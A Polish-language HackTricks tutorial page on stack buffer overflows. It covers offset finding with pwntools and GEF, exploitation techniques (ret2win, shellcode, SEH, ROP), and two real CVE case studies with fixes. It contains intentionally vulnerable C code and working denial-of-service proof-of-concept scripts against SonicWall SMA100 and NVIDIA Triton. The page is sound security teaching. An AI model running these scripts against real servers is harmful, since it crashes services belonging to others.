# Stack Overflow

{{#include ../../banners/hacktricks-training.md}}

## Co to jest Stack Overflow

A **stack overflow** to luka, która występuje, gdy program zapisuje na stos więcej danych niż zostało mu na to przydzielone. Ten nadmiar danych **nadpisze sąsiednią przestrzeń pamięci**, prowadząc do uszkodzenia prawidłowych danych, zakłócenia przepływu sterowania i potencjalnie wykonania złośliwego kodu. Problem ten często wynika z użycia niebezpiecznych funkcji, które nie wykonują sprawdzania ograniczeń (bounds checking) dla danych wejściowych.

Głównym problemem tego nadpisania jest to, że **saved instruction pointer (EIP/RIP)** oraz **saved base pointer (EBP/RBP)**, używane do powrotu do poprzedniej funkcji, są **przechowywane na stosie**. W związku z tym atakujący będzie w stanie je nadpisać i **kontrolować przepływ wykonania programu**.

Luka zwykle powstaje, ponieważ funkcja **kopiuje na stos więcej bajtów niż zostało dla niej przydzielone**, umożliwiając tym samym nadpisanie innych części stosu.

Niektóre powszechne funkcje podatne na to to: **`strcpy`, `strcat`, `sprintf`, `gets`**... Również funkcje takie jak **`fgets`**, **`read`** i **`memcpy`**, które przyjmują **argument długości**, mogą być użyte w sposób podatny, jeśli podana długość jest większa niż przydzielona.

Na przykład, następujące funkcje mogą być podatne:
```c
void vulnerable() {
char buffer[128];
printf("Enter some text: ");
gets(buffer); // This is where the vulnerability lies
printf("You entered: %s\n", buffer);
}
```
### Finding Stack Overflows offsets

Najczęstszym sposobem wykrywania Stack Overflows jest podanie bardzo dużego wejścia składającego się z `A` (np. `python3 -c 'print("A"*1000)'`) i oczekiwanie na `Segmentation Fault`, co wskazuje, że **próbowano uzyskać dostęp do adresu `0x41414141`**.

Ponadto, gdy już stwierdzisz istnienie podatności Stack Overflow, będziesz musiał znaleźć offset umożliwiający **overwrite the return address** — do tego zwykle używa się **De Bruijn sequence.** Dla zadanego alfabetu o rozmiarze _k_ i podciągów długości _n_ jest to **cykliczna sekwencja, w której każdy możliwy podciąg długości _n_ pojawia się dokładnie raz** jako spójny podciąg.

Dzięki temu, zamiast ręcznie ustalać, który offset jest potrzebny do kontrolowania EIP, można użyć jako paddingu jednej z takich sekwencji, a następnie znaleźć offset bajtów, które ją nadpisały.

Do tego można użyć **pwntools** dla tego:
```python
from pwn import *

# Generate a De Bruijn sequence of length 1000 with an alphabet size of 256 (byte values)
pattern = cyclic(1000)

# This is an example value that you'd have found in the EIP/IP register upon crash
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)  # Finds the offset of the sequence in the De Bruijn pattern
print(f"The offset is: {offset}")
```
lub **GEF**:
```bash
#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp
```
## Wykorzystywanie Stack Overflows

Podczas overflowu (zakładając, że rozmiar overflowu jest wystarczająco duży) będziesz w stanie **nadpisać** wartości zmiennych lokalnych na stacku aż do zapisanych **EBP/RBP and EIP/RIP (or even more)**.\
Najczęstszym sposobem nadużycia tego typu podatności jest **zmodyfikowanie adresu powrotu**, tak aby po zakończeniu funkcji **przepływ sterowania został przekierowany w miejsce wskazane przez użytkownika** w tym wskaźniku.

Jednak w innych scenariuszach samo **nadpisanie wartości niektórych zmiennych na stacku** może wystarczyć do eksploatacji (np. w prostych zadaniach CTF).

### Ret2win

W tego typu zadaniach CTF istnieje **function** **inside** the binary, która **never called** i którą **musisz wywołać, aby wygrać**. W tych zadaniach wystarczy znaleźć **offset to overwrite the return address** oraz **find the address of the function** do wywołania (zazwyczaj [**ASLR**](../common-binary-protections-and-bypasses/aslr/index.html) będzie wyłączony), tak aby po zwróceniu się podatnej funkcji została wywołana ukryta funkcja:


{{#ref}}
ret2win/
{{#endref}}

### Stack Shellcode

W tym scenariuszu atakujący może umieścić shellcode na stacku i użyć kontrolowanego EIP/RIP, aby skoczyć do shellcode'a i wykonać dowolny kod:


{{#ref}}
stack-shellcode/
{{#endref}}

### Windows SEH-based exploitation (nSEH/SEH)

Na 32-bitowym Windows overflow może nadpisać łańcuch Structured Exception Handler (SEH) zamiast zapisanego adresu powrotu. Eksploatacja zazwyczaj zastępuje wskaźnik SEH gadgetem POP POP RET i używa 4-bajtowego pola nSEH do krótkiego skoku, aby wrócić do dużego bufora, w którym znajduje się shellcode. Powszechny wzorzec to krótki jmp w nSEH, który ląduje na 5-bajtowym near jmp umieszczonym tuż przed nSEH, aby przeskoczyć setki bajtów z powrotem do początku payloadu.


{{#ref}}
windows-seh-overflow.md
{{#endref}}

### ROP & Ret2... techniques

Ta technika jest podstawowym mechanizmem pozwalającym obejść główną ochronę przeciwko poprzedniej technice: **No executable stack (NX)**. Pozwala też wykonać kilka innych technik (ret2lib, ret2syscall...), które finalnie uruchomią dowolne polecenia wykorzystując istniejące instrukcje w binarce:


{{#ref}}
../rop-return-oriented-programing/
{{#endref}}

## Heap Overflows

Overflow nie zawsze będzie w stacku, może być również w **heap** na przykład:


{{#ref}}
../libc-heap/heap-overflow.md
{{#endref}}

## Rodzaje zabezpieczeń

Istnieje kilka zabezpieczeń próbujących zapobiegać eksploatacji podatności — sprawdź je w:


{{#ref}}
../common-binary-protections-and-bypasses/
{{#endref}}

### Przykład z rzeczywistego świata: CVE-2025-40596 (SonicWall SMA100)

Dobre pokazanie, dlaczego **`sscanf` should never be trusted for parsing untrusted input**, pojawiło się w 2025 roku w urządzeniu SonicWall SMA100 SSL-VPN. Podatna procedura wewnątrz `/usr/src/EasyAccess/bin/httpd` próbuje wyodrębnić wersję i endpoint z dowolnego URI, które zaczyna się od `/__api__/`:
```c
char version[3];
char endpoint[0x800] = {0};
/* simplified proto-type */
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
```
1. Pierwsza konwersja (`%2s`) bezpiecznie zapisuje **dwa** bajty do `version` (np. `"v1"`).
2. Druga konwersja (`%s`) **nie ma specyfikatora długości**, dlatego `sscanf` będzie kopiować **aż do pierwszego bajtu NUL**.
3. Ponieważ `endpoint` znajduje się na **stack** i ma długość **0x800 bajtów**, podanie ścieżki dłuższej niż 0x800 bajtów uszkadza wszystko, co znajduje się po buforze ‑ w tym **stack canary** i **saved return address**.

Wystarczy jedno-liniowy proof-of-concept, aby wywołać crash **before authentication**:
```python
import requests, warnings
warnings.filterwarnings('ignore')
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
```
Mimo że stack canaries przerywają proces, atakujący i tak uzyskuje prymityw **Denial-of-Service** (a przy dodatkowych information leaks, możliwe jest code-execution).  Wniosek jest prosty:

* Zawsze określaj **maksymalną szerokość pola** (np. `%511s`).
* Preferuj bezpieczniejsze alternatywy, takie jak `snprintf`/`strncpy_s`.

### Przykład z rzeczywistego świata: CVE-2025-23310 & CVE-2025-23311 (NVIDIA Triton Inference Server)

NVIDIA’s Triton Inference Server (≤ v25.06) zawierał wiele **stack-based overflows** dostępnych przez jego HTTP API.
Wzorzec podatności pojawiał się wielokrotnie w `http_server.cc` i `sagemaker_server.cc`:
```c
int n = evbuffer_peek(req->buffer_in, -1, NULL, NULL, 0);
if (n > 0) {
/* allocates 16 * n bytes on the stack */
struct evbuffer_iovec *v = (struct evbuffer_iovec *)
alloca(sizeof(struct evbuffer_iovec) * n);
...
}
```
1. `evbuffer_peek` (libevent) zwraca **liczbę wewnętrznych segmentów bufora**, które tworzą bieżące ciało żądania HTTP.
2. Każdy segment powoduje alokację **16-byte** `evbuffer_iovec` na **stack** za pomocą `alloca()` – **bez żadnego górnego ograniczenia**.
3. Nadużywając **HTTP _chunked transfer-encoding_**, klient może zmusić żądanie do podziału na **setki tysięcy 6-bajtowych kawałków** (`"1\r\nA\r\n"`). To powoduje, że `n` rośnie nieograniczenie aż do wyczerpania stack.

#### Dowód koncepcji (DoS)
```python
#!/usr/bin/env python3
import socket, sys

def exploit(host="localhost", port=8000, chunks=523_800):
s = socket.create_connection((host, port))
s.sendall((
f"POST /v2/models/add_sub/infer HTTP/1.1\r\n"
f"Host: {host}:{port}\r\n"
"Content-Type: application/octet-stream\r\n"
"Inference-Header-Content-Length: 0\r\n"
"Transfer-Encoding: chunked\r\n"
"Connection: close\r\n\r\n"
).encode())

for _ in range(chunks):                  # 6-byte chunk ➜ 16-byte alloc
s.send(b"1\r\nA\r\n")            # amplification factor ≈ 2.6x
s.sendall(b"0\r\n\r\n")               # end of chunks
s.close()

if __name__ == "__main__":
exploit(*sys.argv[1:])
```
Żądanie o wielkości ~3 MB wystarczy, aby nadpisać saved return address i **crash** daemona na default build.

#### Poprawka i środki zaradcze
Wydanie 25.07 zastępuje unsafe stack allocation za pomocą **heap-backed `std::vector`** i elegancko obsługuje `std::bad_alloc`:
```c++
std::vector<evbuffer_iovec> v_vec;
try {
v_vec = std::vector<evbuffer_iovec>(n);
} catch (const std::bad_alloc &e) {
return TRITONSERVER_ErrorNew(TRITONSERVER_ERROR_INVALID_ARG, "alloc failed");
}
struct evbuffer_iovec *v = v_vec.data();
```
Wnioski:
* Nigdy nie wywołuj `alloca()` z rozmiarami kontrolowanymi przez atakującego.
* Żądania chunked mogą drastycznie zmienić kształt buforów po stronie serwera.
* Zwaliduj / ogranicz każdą wartość pochodzącą od klienta *zanim* użyjesz jej do alokacji pamięci.

## Źródła
* [watchTowr Labs – Stack Overflows, Heap Overflows and Existential Dread (SonicWall SMA100)](https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/)
* [Trail of Bits – Uncovering memory corruption in NVIDIA Triton](https://blog.trailofbits.com/2025/08/04/uncovering-memory-corruption-in-nvidia-triton-as-a-new-hire/)
* [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)

{{#include ../../banners/hacktricks-training.md}}
